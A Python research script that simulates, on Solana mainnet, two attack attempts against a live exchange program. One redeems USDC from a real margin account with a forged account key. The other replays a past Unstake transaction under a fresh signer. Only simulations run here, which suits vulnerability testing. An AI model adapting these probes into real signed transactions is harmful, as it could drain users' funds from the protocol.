#!/usr/bin/env python3
"""Test: (a) RedeemUsdc on a zamm margin with forged zamm key; (b) staker Unstake replay with fresh signer."""
import json, urllib.request, time, base64
from solders.transaction import VersionedTransaction, Transaction
from solders.message import Message
from solders.pubkey import Pubkey
from solders.instruction import Instruction, AccountMeta
from solders.hash import Hash

RPC="https://api.mainnet-beta.solana.com"
def rpc(method, params, retries=4, timeout=120):
    body=json.dumps({"jsonrpc":"2.0","id":1,"method":method,"params":params}).encode()
    last=None
    for i in range(retries):
        try:
            req=urllib.request.Request(RPC,data=body,headers={"Content-Type":"application/json","User-Agent":"research/1.0"})
            with urllib.request.urlopen(req,timeout=timeout) as r: out=json.loads(r.read())
            if "error" in out: raise RuntimeError(out["error"])
            return out
        except Exception as e:
            last=e; time.sleep(1.0*(i+1))
    raise RuntimeError(str(last))

def sim_tx(tx_bytes,label):
    b64=base64.b64encode(bytes(tx_bytes)).decode()
    r=rpc("simulateTransaction",[b64,{"encoding":"base64","sigVerify":False,"replaceRecentBlockhash":True,"commitment":"processed"}])
    v=r["result"]["value"]; logs=v.get("logs") or []
    print(f"\n### {label}\n  err: {json.dumps(v.get('err'))}")
    for l in logs:
        if "AnchorError" in l or "Instruction:" in l or "failed" in l.lower() or "log:" in l and "zamm" in l.lower():
            print("   log:",l[:200])
    return {"label":label,"err":v.get("err"),"logs":logs}

results=[]
# (a) redeem a zamm margin with a forged zamm key in remaining accounts
ZO=Pubkey.from_string("Zo1ggzTUKMY5bYnDvT5mtVeZxzf2FaLTbKkmvGUhUQk")
TOKEN=Pubkey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
STATE=Pubkey.from_string("71yykwxq1zQqy99PgRsgZJXi2HHK2UDx9G4va7pH6qRv")
VAULT=Pubkey.from_string("HjHSNe8hhvZ8hKCRrhKg1DGiGPd9NYQbUjT1SQRDo4kZ")
A2=Pubkey.from_string("6kSuaA8Fi16ks53ye8eqgr7jZn2uus59W7gMSasgtFon")
A8=Pubkey.from_string("Dwi4TnaYJTMUkVaHQgfKq6QzuWsyFSJwMxzkTemTLrvt")
VAULT_ATA=Pubkey.from_string("3er2PEWxhpuRkbVwE3ks2nynr5EtcSjCs5fdDJiKQocp")
USDC=Pubkey.from_string("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v")
REDEEM_DATA=bytes.fromhex("658ef6b8c6385cae")
M=lambda pk,s,w: AccountMeta(pk,s,w)
# zamm margin + its authority
ZM=Pubkey.from_string("CX2tWRJC9z3L6zwnBTAk2keWVzUXgju6LFu9wzso9Zfn")
mv=rpc("getAccountInfo",[str(ZM),{"encoding":"base64"}])["result"]["value"]
raw=base64.b64decode(mv["data"][0]); ZAUTH=Pubkey.from_bytes(raw[9:41]); ZCTRL=Pubkey.from_bytes(raw[441:473])
print("zamm margin auth:",ZAUTH,"ctrl:",ZCTRL)
forged=Pubkey.new_unique()
dest=Pubkey.from_string("3RKQCBVZ55CKZJTVG7qyo25EhyEQUGQL4LGQXKFuXb1g")  # not zamm auth's ATA; we test error order
ix=Instruction(ZO,REDEEM_DATA,[M(STATE,False,True),M(VAULT,False,False),M(A2,False,True),M(ZAUTH,True,True),
    M(ZM,False,True),M(ZCTRL,False,True),M(dest,False,True),M(VAULT_ATA,False,True),M(A8,False,False),M(TOKEN,False,False),
    M(forged,False,False)])  # extra remaining account: forged "zamm key"
msg=Message.new_with_blockhash([ix],ZAUTH,Hash.default())
results.append(sim_tx(Transaction.new_unsigned(msg),"ZAMM-1: zamm margin redeem + forged zamm key (remaining acct)"))

# (b) staker Unstake replay with fresh signer
sig="4cnfZdnHwkYnAk9jPdFKDDdE7ep3siroZgAPrUWCNkqFm1Gk3M993hEPUy83h6LT3ZR3K9q1i7bSbfVrAQEJzMNc"
r=rpc("getTransaction",[sig,{"encoding":"base64","maxSupportedTransactionVersion":0}])["result"]
tx=VersionedTransaction.from_bytes(base64.b64decode(r["transaction"][0]))
msg=tx.message; keys=list(msg.account_keys)
print("\nUnstake tx signer:", keys[0], "num keys:", len(keys))
for i,k in enumerate(keys): print(f"  [{i}] {k}")
for ix in msg.instructions:
    print("  ix prog:", ix.program_id, "accounts:", list(ix.accounts), "data:", bytes(ix.data).hex()[:40])
results.append(sim_tx(tx,"UNSTAKE as-is (orig signer)"))
keys2=list(keys); keys2[0]=Pubkey.new_unique()
new_msg=Message.new_with_compiled_instructions(msg.header.num_required_signatures,msg.header.num_readonly_signed_accounts,
    msg.header.num_readonly_unsigned_accounts, keys2, Hash.default(), list(msg.instructions))
results.append(sim_tx(Transaction.new_unsigned(new_msg),"UNSTAKE fresh signer"))
json.dump(results,open("analysis/sim_zamm_unstake.json","w"),indent=1,default=str)
print("\nDONE")
